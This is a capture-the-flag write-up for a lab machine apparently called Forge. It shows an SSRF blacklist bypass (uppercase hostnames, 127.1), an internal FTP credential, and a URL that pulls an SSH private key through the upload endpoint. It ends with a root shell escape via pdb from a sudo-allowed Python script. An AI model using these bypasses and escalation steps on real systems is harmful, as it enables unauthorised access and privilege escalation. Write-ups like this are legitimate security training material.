# Forge

Difficulty: 5
Key takeway: 127.1 is the same as 127.0.0.1; you can access internal ftp server through a remote url file upload service 
Tags: file upload, ftp, pdb, python, remote url file upload, script, sudo -l
Type: Linux

# Enumeration

portscan 

```bash
ports 22, 80 are open
```

- found a subdomain `admin.forge.htb` which is accessible from [localhost](http://localhost) only
- used the upload file from url thing to get the source of admin.forge.htb
    - [http://ADMIN.FORGE.HTB](http://ADMIN.FORGE.HTB) → capitals bypasses the url blacklist filter but the browser can easily understand it
    - [http://127.1](http://127.1) → is the same as http://127.0.0.1
- Found this response after intercepting the response from BurpSuite

```bash
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

- in /announcements

```bash
<ul>
        <li>An internal ftp server has been setup with credentials as **user:heightofsecurity123!**</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
```

# Initial Access

- we can access the internal ftp server to get the id_rsa key
    
    ```bash
    # in the url file upload input
    http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/.ssh/id_rsa
    ```
    
- use the ssh key to login

# Privilege Escalation

- sudo -l reveals that we can run /usr/bin/python3 /opt/remote-manage.py without any password as root

```python
port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

- can't do anything with the subprocesses
- trying to exploit pdb

```python
(Pdb) !import os
(Pdb) !os.system("/bin/sh")
# whoami
root
```

## Notes

- ! → used for execution in pdb shell